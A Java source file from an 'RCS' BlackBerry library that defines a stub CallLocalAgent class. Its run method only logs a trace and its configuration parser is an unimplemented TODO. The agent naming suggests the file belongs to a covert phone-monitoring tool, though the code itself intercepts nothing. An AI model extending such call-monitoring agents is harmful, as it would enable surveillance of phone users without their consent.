/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : CallLocalAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class CallLocalAgent extends Agent {
	//#debug
    private static Debug debug = new Debug("CallLocalAgent", DebugLevel.VERBOSE);

    public CallLocalAgent(boolean agentStatus) {
        super(Agent.AGENT_CALL_LOCAL, agentStatus, true, "CallLocalAgent");
    }

    protected CallLocalAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");


    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
